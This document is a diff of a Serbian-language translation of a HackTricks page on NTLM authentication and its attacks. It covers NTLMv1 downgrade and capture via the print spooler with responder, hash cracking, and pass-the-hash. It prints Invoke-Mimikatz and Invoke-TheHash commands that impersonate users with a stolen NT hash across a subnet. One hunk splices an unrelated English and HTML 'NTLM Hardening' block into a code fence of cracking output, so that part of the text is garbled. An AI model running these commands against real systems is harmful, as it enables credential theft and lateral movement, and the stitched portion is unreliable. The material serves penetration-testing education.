@@ -19,7 +19,7 @@ Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" d
 
 U okruženjima gde su **Windows XP i Server 2003** u upotrebi, koriste se LM (Lan Manager) hešovi, iako je široko priznato da se lako kompromituju. Određeni LM heš, `AAD3B435B51404EEAAD3B435B51404EE`, ukazuje na situaciju u kojoj LM nije korišćen, predstavljajući heš za prazan string.
 
-Podrazumevano, **Kerberos** autentifikacioni protokol je primarna metoda koja se koristi. NTLM (NT LAN Manager) dolazi u obzir pod određenim okolnostima: odsustvo Active Directory, nepostojanje domena, neispravnost Kerberosa zbog nepravilne konfiguracije, ili kada se pokušavaju povezati koristeći IP adresu umesto važećeg imena hosta.
+Podrazumevano, **Kerberos** autentifikacioni protokol je primarna metoda koja se koristi. NTLM (NT LAN Manager) ulazi u igru pod određenim okolnostima: odsustvo Active Directory, nepostojanje domena, neispravnost Kerberosa zbog nepravilne konfiguracije, ili kada se pokušavaju povezati koristeći IP adresu umesto važećeg imena hosta.
 
 Prisutnost **"NTLMSSP"** zaglavlja u mrežnim paketima signalizira NTLM autentifikacioni proces.
 
@@ -27,7 +27,7 @@ Podrška za autentifikacione protokole - LM, NTLMv1 i NTLMv2 - omogućena je spe
 
 **Ključne tačke**:
 
-* LM hešovi su ranjivi, a prazan LM heš (`AAD3B435B51404EEAAD3B435B51404EE`) označava njegovo ne korišćenje.
+* LM hešovi su ranjivi i prazan LM heš (`AAD3B435B51404EEAAD3B435B51404EE`) označava njegovo ne korišćenje.
 * Kerberos je podrazumevana metoda autentifikacije, dok se NTLM koristi samo pod određenim uslovima.
 * NTLM autentifikacioni paketi su prepoznatljivi po "NTLMSSP" zaglavlju.
 * LM, NTLMv1 i NTLMv2 protokoli su podržani od strane sistemske datoteke `msv1\_0.dll`.
@@ -38,7 +38,7 @@ Možete proveriti i konfigurisati koji protokol će se koristiti:
 
 ### GUI
 
-Izvršite _secpol.msc_ -> Lokalne politike -> Opcije bezbednosti -> Mrežna bezbednost: LAN Manager nivo autentifikacije. Postoji 6 nivoa (od 0 do 5).
+Izvršite _secpol.msc_ -> Lokalne politike -> Bezbednosne opcije -> Mrežna bezbednost: LAN Manager nivo autentifikacije. Postoji 6 nivoa (od 0 do 5).
 
 ![](<../../.gitbook/assets/image (919).png>)
 
@@ -62,7 +62,7 @@ Moguće vrednosti:
 1. **korisnik** unosi svoje **akreditive**
 2. Klijentska mašina **šalje zahtev za autentifikaciju** šaljući **ime domena** i **korisničko ime**
 3. **server** šalje **izazov**
-4. **klijent enkriptuje** **izazov** koristeći heš lozinke kao ključ i šalje ga kao odgovor
+4. **klijent enkriptuje** **izazov** koristeći hash lozinke kao ključ i šalje ga kao odgovor
 5. **server šalje** **kontroloru domena** **ime domena, korisničko ime, izazov i odgovor**. Ako **nije** konfigurisan Active Directory ili je ime domena ime servera, akreditive se **proveravaju lokalno**.
 6. **kontrolor domena proverava da li je sve ispravno** i šalje informacije serveru
 
@@ -70,28 +70,28 @@ Moguće vrednosti:
 
 ### Lokalna NTLM autentifikacija
 
-Autentifikacija je kao ona pomenuta **pre, ali** **server** zna **heš korisnika** koji pokušava da se autentifikuje unutar **SAM** datoteke. Tako, umesto da pita kontrolora domena, **server će sam proveriti** da li korisnik može da se autentifikuje.
+Autentifikacija je kao ona pomenuta **pre, ali** **server** zna **hash korisnika** koji pokušava da se autentifikuje unutar **SAM** datoteke. Tako da, umesto da pita kontrolora domena, **server će sam proveriti** da li korisnik može da se autentifikuje.
 
 ### NTLMv1 izazov
 
 **dužina izazova je 8 bajtova** i **odgovor je dug 24 bajta**.
 
-**heš NT (16 bajtova)** je podeljen u **3 dela od po 7 bajtova** (7B + 7B + (2B+0x00\*5)): **poslednji deo je popunjen nulama**. Zatim, **izazov** se **šifruje odvojeno** sa svakim delom i **rezultantni** šifrovani bajtovi se **spajaju**. Ukupno: 8B + 8B + 8B = 24B.
+**hash NT (16 bajtova)** je podeljen u **3 dela od po 7 bajtova** (7B + 7B + (2B+0x00\*5)): **poslednji deo je popunjen nulama**. Zatim, **izazov** se **šifruje odvojeno** sa svakim delom i **rezultantni** šifrovani bajtovi se **spajaju**. Ukupno: 8B + 8B + 8B = 24B.
 
 **Problemi**:
 
 * Nedostatak **slučajnosti**
-* 3 dela mogu biti **napadnuta odvojeno** da bi se pronašao NT heš
+* 3 dela mogu biti **napadnuta odvojeno** da bi se pronašao NT hash
 * **DES se može probiti**
 * 3. ključ se uvek sastoji od **5 nula**.
-* Dajući **isti izazov**, **odgovor** će biti **isti**. Tako, možete dati kao **izazov** žicu "**1122334455667788**" i napasti odgovor koristeći **prekomponovane rainbow tabele**.
+* Dajući **isti izazov**, **odgovor** će biti **isti**. Tako da možete dati kao **izazov** žicu "**1122334455667788**" i napasti odgovor koristeći **prekomponovane rainbow tabele**.
 
 ### NTLMv1 napad
 
 Danas postaje sve ređe naći okruženja sa konfigurisanom Unconstrained Delegation, ali to ne znači da ne možete **zloupotrebiti Print Spooler servis** koji je konfigurisan.
 
 Možete zloupotrebiti neke akreditive/sesije koje već imate na AD da **tražite od štampača da se autentifikuje** protiv nekog **hosta pod vašom kontrolom**. Zatim, koristeći `metasploit auxiliary/server/capture/smb` ili `responder` možete **postaviti izazov za autentifikaciju na 1122334455667788**, uhvatiti pokušaj autentifikacije, i ako je izvršen koristeći **NTLMv1** moći ćete da ga **probijete**.\
-Ako koristite `responder`, možete pokušati da \*\*koristite flag `--lm` \*\* da biste pokušali da **smanjite** **autentifikaciju**.\
+Ako koristite `responder`, možete pokušati da \*\*koristite flag `--lm` \*\* da pokušate da **smanjite** **autentifikaciju**.\
 &#xNAN;_&#x4E;ote da za ovu tehniku autentifikacija mora biti izvršena koristeći NTLMv1 (NTLMv2 nije validan)._
 
 Zapamtite da će štampač koristiti račun računara tokom autentifikacije, a računi računara koriste **duge i slučajne lozinke** koje **verovatno nećete moći da probijete** koristeći uobičajene **rečnike**. Ali **NTLMv1** autentifikacija **koristi DES** ([više informacija ovde](./#ntlmv1-challenge)), tako da koristeći neke usluge posebno posvećene probijanju DES-a moći ćete da ga probijete (možete koristiti [https://crack.sh/](https://crack.sh) ili [https://ntlmv1.com/](https://ntlmv1.com) na primer).
@@ -135,22 +135,35 @@ NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 
 NTLM (NT LAN Manager) is a Microsoft authentication protocol. It is important to harden NTLM to prevent various attacks.
 
-## Why Harden NTLM?
+## Recommendations
 
-Hardenovanje NTLM-a je ključno za zaštitu od napada kao što su:
-
-- **Pass-the-Hash**: Napad gde napadač koristi hash lozinke umesto same lozinke.
-- **Replay Attacks**: Napadi gde napadač ponovo koristi validne autentifikacione informacije.
-
-## Best Practices
-
-1. **Disable NTLM**: Gde god je to moguće, onemogućite NTLM.
-2. **Use Kerberos**: Preferirajte Kerberos kao protokol autentifikacije.
-3. **Limit NTLM Usage**: Ograničite korišćenje NTLM-a na neophodne sisteme.
+1. **Disable NTLM**: If possible, disable NTLM authentication in your environment.
+2. **Use Kerberos**: Prefer Kerberos over NTLM for authentication.
+3. **Limit NTLM usage**: Restrict NTLM usage to only necessary applications.
+4. **Monitor NTLM traffic**: Keep an eye on NTLM traffic for any suspicious activity.
 
 ## Conclusion
 
-Hardenovanje NTLM-a je ključno za sigurnost vaših sistema. Primenite najbolje prakse kako biste smanjili rizik od napada.
+Hardening NTLM is crucial for maintaining security in a Windows environment.
+```
+
+```html
+<h1>NTLM Hardening</h1>
+
+<p>NTLM (NT LAN Manager) je Microsoft-ov protokol za autentifikaciju. Važno je ojačati NTLM kako bi se sprečili razni napadi.</p>
+
+<h2>Preporuke</h2>
+
+<ol>
+    <li><strong>Onemogućite NTLM</strong>: Ako je moguće, onemogućite NTLM autentifikaciju u vašem okruženju.</li>
+    <li><strong>Koristite Kerberos</strong>: Preferirajte Kerberos umesto NTLM za autentifikaciju.</li>
+    <li><strong>Ograničite korišćenje NTLM</strong>: Ograničite korišćenje NTLM samo na neophodne aplikacije.</li>
+    <li><strong>Pratite NTLM saobraćaj</strong>: Pratite NTLM saobraćaj za bilo kakvu sumnjivu aktivnost.</li>
+</ol>
+
+<h2>Zaključak</h2>
+
+<p>Ojačavanje NTLM-a je ključno za održavanje bezbednosti u Windows okruženju.</p>
 ```
 ```bash
 727B4E35F947129E:1122334455667788
@@ -189,20 +202,20 @@ NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
 ### NTLMv2 Challenge
 
-Dužina **izazova je 8 bajtova** i **2 odgovora se šalju**: Jedan je **24 bajta** dug, a dužina **drugog** je **varijabilna**.
+Dužina **izazova je 8 bajtova** i **2 odgovora se šalju**: Jedan je **dužine 24 bajta** a dužina **drugog** je **varijabilna**.
 
 **Prvi odgovor** se kreira šifrovanjem koristeći **HMAC\_MD5** **niz** sastavljen od **klijenta i domena** i koristeći kao **ključ** **MD4** heš **NT heša**. Zatim, **rezultat** će se koristiti kao **ključ** za šifrovanje koristeći **HMAC\_MD5** **izazov**. Tome, **izazov klijenta od 8 bajtova će biti dodat**. Ukupno: 24 B.
 
 **Drugi odgovor** se kreira koristeći **nekoliko vrednosti** (novi izazov klijenta, **vremensku oznaku** da bi se izbegli **replay napadi**...)
 
-Ako imate **pcap koji je uhvatio uspešan proces autentifikacije**, možete pratiti ovaj vodič da dobijete domenu, korisničko ime, izazov i odgovor i pokušate da provalite lozinku: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
+Ako imate **pcap koji je uhvatio uspešan proces autentifikacije**, možete pratiti ovaj vodič da dobijete domenu, korisničko ime, izazov i odgovor i pokušate da probijete lozinku: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
 
 ## Pass-the-Hash
 
 **Kada imate heš žrtve**, možete ga koristiti da **imitirate**.\
-Trebalo bi da koristite **alat** koji će **izvršiti** **NTLM autentifikaciju koristeći** taj **heš**, **ili** možete kreirati novu **sessionlogon** i **ubaciti** taj **heš** unutar **LSASS**, tako da kada se izvrši bilo koja **NTLM autentifikacija**, taj **heš će biti korišćen.** Poslednja opcija je ono što radi mimikatz.
+Treba da koristite **alat** koji će **izvršiti** **NTLM autentifikaciju koristeći** taj **heš**, **ili** možete kreirati novu **sessionlogon** i **ubaciti** taj **heš** unutar **LSASS**, tako da kada se izvrši bilo koja **NTLM autentifikacija**, taj **heš će biti korišćen.** Poslednja opcija je ono što radi mimikatz.
 
-**Molimo vas, zapamtite da možete izvesti Pass-the-Hash napade takođe koristeći račune računara.**
+**Molim vas, zapamtite da možete izvršiti Pass-the-Hash napade takođe koristeći račune računara.**
 
 ### **Mimikatz**
 
@@ -210,7 +223,7 @@ Trebalo bi da koristite **alat** koji će **izvršiti** **NTLM autentifikaciju k
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-Ovo će pokrenuti proces koji će pripadati korisnicima koji su pokrenuli mimikatz, ali interno u LSASS-u sačuvane kredencijale su one unutar mimikatz parametara. Zatim, možete pristupiti mrežnim resursima kao da ste taj korisnik (slično `runas /netonly` triku, ali ne morate znati lozinku u običnom tekstu).
+Ovo će pokrenuti proces koji će pripadati korisnicima koji su pokrenuli mimikatz, ali interno u LSASS-u sačuvane akreditive su oni unutar mimikatz parametara. Tada možete pristupiti mrežnim resursima kao da ste taj korisnik (slično triku `runas /netonly`, ali ne morate znati lozinku u običnom tekstu).
 
 ### Pass-the-Hash sa linux-a
 
@@ -248,7 +261,7 @@ Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff
 ```
 #### Invoke-TheHash
 
-Ova funkcija je **mešavina svih drugih**. Možete proslediti **nekoliko hostova**, **isključiti** neke i **izabrati** **opciju** koju želite da koristite (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ako izaberete **bilo koju** od **SMBExec** i **WMIExec** ali ne date _**Command**_ parametar, samo će **proveriti** da li imate **dovoljno dozvola**.
+Ova funkcija je **mešavina svih drugih**. Možete proslediti **više hostova**, **isključiti** neke i **izabrati** **opciju** koju želite da koristite (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ako izaberete **bilo koju** od **SMBExec** i **WMIExec** ali ne date _**Command**_ parametar, samo će **proveriti** da li imate **dovoljno dozvola**.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
@@ -290,7 +303,7 @@ Učite i vežbajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt=""
 
 <details>
 
-<summary>Podržite HackTricks</summary>
+<summary>Podrška HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
